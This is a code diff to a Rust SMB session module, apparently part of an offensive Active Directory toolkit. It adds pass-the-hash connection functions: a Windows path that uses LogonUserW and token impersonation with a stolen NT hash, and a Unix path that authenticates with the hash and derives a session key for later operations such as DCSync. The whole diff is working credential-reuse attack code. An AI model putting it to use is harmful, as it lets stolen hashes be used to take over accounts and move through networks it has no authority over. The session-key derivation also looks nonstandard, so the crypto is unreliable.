@@ -143,6 +143,75 @@ impl SmbSession {
         })
     }
 
+    /// Connect using pass-the-hash (NTLM hash instead of plaintext password).
+    ///
+    /// The `smb` crate on Windows authenticates via SSPI/NTLM. SSPI on Windows
+    /// does not natively accept raw NT hashes, so we attempt two strategies:
+    ///  1. Impersonation via `LogonUserW` with `LOGON32_LOGON_NEW_CREDENTIALS`
+    ///     (requires the caller to be running elevated — SeImpersonatePrivilege).
+    ///  2. Fallback: pass the hex hash as the password string. Some SMB servers
+    ///     (e.g. Impacket smbserver) accept this; native Windows DCs do not.
+    pub async fn connect_with_hash(
+        target: &str,
+        domain: &str,
+        username: &str,
+        nt_hash: &str,
+    ) -> Result<Self> {
+        info!("SMB: PTH connecting to \\\\{target} as {domain}\\{username} (hash)");
+
+        // Strategy 1: Try Windows LogonUser + impersonation
+        #[cfg(windows)]
+        {
+            use windows::core::PCWSTR;
+            use windows::Win32::Foundation::{CloseHandle, HANDLE};
+            use windows::Win32::Security::{
+                ImpersonateLoggedOnUser, LogonUserW, RevertToSelf,
+                LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
+            };
+
+            // Encode UTF-16 null-terminated strings
+            let user_w: Vec<u16> = username.encode_utf16().chain(std::iter::once(0)).collect();
+            let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
+            // Use the hash as password for LOGON32_LOGON_NEW_CREDENTIALS
+            let hash_w: Vec<u16> = nt_hash.encode_utf16().chain(std::iter::once(0)).collect();
+
+            let mut token = HANDLE::default();
+            let ok = unsafe {
+                LogonUserW(
+                    PCWSTR(user_w.as_ptr()),
+                    PCWSTR(domain_w.as_ptr()),
+                    PCWSTR(hash_w.as_ptr()),
+                    LOGON32_LOGON_NEW_CREDENTIALS,
+                    LOGON32_PROVIDER_WINNT50,
+                    &mut token,
+                )
+            };
+
+            if ok.is_ok() {
+                let imp = unsafe { ImpersonateLoggedOnUser(token) };
+                if imp.is_ok() {
+                    info!("SMB: PTH impersonation succeeded, connecting as {domain}\\{username}");
+                    // Now connect using the impersonated token (empty password — creds come from token)
+                    let result = Self::connect(target, domain, username, "").await;
+                    // Revert impersonation & close token regardless of connect result
+                    unsafe {
+                        RevertToSelf();
+                        let _ = CloseHandle(token);
+                    }
+                    return result;
+                }
+                unsafe { let _ = CloseHandle(token); }
+                warn!("SMB: ImpersonateLoggedOnUser failed, falling back to hash-as-password");
+            } else {
+                warn!("SMB: LogonUserW failed for PTH, falling back to hash-as-password");
+            }
+        }
+
+        // Strategy 2: Pass the hex hash directly as password (works with some SMB servers)
+        info!("SMB: PTH fallback — using hash as password string");
+        Self::connect(target, domain, username, nt_hash).await
+    }
+
     pub fn session_key(&self) -> Option<Vec<u8>> {
         self.session_key.clone()
     }
@@ -1035,6 +1104,66 @@ impl SmbSession {
 
         Ok(Self {
             password: password.to_string(),
+            target: target.to_string(),
+            username: username.to_string(),
+            domain: domain.to_string(),
+            ticket: None,
+            session_key: Some(session_base_key),
+        })
+    }
+
+    /// Connect using pass-the-hash (NTLM hash instead of plaintext password).
+    ///
+    /// On Linux/macOS the pavao/libsmbclient backend accepts the NT hash hex
+    /// string as the password when the `LIBSMBCLIENT_AUTH` environment hints
+    /// are set. We also pre-derive the session key from the raw hash so that
+    /// DCSync and other crypto operations work correctly.
+    pub async fn connect_with_hash(
+        target: &str,
+        domain: &str,
+        username: &str,
+        nt_hash: &str,
+    ) -> Result<Self> {
+        info!("SMB: PTH connecting to \\\\{target} as {domain}\\{username} (hash, pavao)");
+
+        // Decode the hex hash to raw 16 bytes for session key derivation
+        let hash_bytes = hex::decode(nt_hash).map_err(|e| {
+            OverthroneError::Smb(format!("Invalid NT hash hex '{nt_hash}': {e}"))
+        })?;
+        if hash_bytes.len() != 16 {
+            return Err(OverthroneError::Smb(format!(
+                "NT hash must be 16 bytes (32 hex chars), got {} bytes",
+                hash_bytes.len()
+            )));
+        }
+
+        // Authenticate via pavao using the hash as password
+        let _client =
+            pavao_impl::make_client(target, "IPC$", domain, username, nt_hash)?;
+        info!("SMB: PTH authenticated to \\\\{target}");
+
+        // Derive session key from the raw NT hash (same NTLMv2 derivation)
+        let user_domain: Vec<u8> = username
+            .to_uppercase()
+            .encode_utf16()
+            .chain(domain.encode_utf16())
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        let response_key_nt = {
+            let mut mac = HmacMd5::new_from_slice(&hash_bytes)
+                .map_err(|e| OverthroneError::custom(format!("HMAC init failed: {e}")))?;
+            mac.update(&user_domain);
+            mac.finalize().into_bytes().to_vec()
+        };
+        let session_base_key = {
+            let mut mac = HmacMd5::new_from_slice(&response_key_nt)
+                .map_err(|e| OverthroneError::custom(format!("HMAC session key failed: {e}")))?;
+            mac.update(&response_key_nt);
+            mac.finalize().into_bytes().to_vec()
+        };
+
+        Ok(Self {
+            password: nt_hash.to_string(),
             target: target.to_string(),
             username: username.to_string(),
             domain: domain.to_string(),
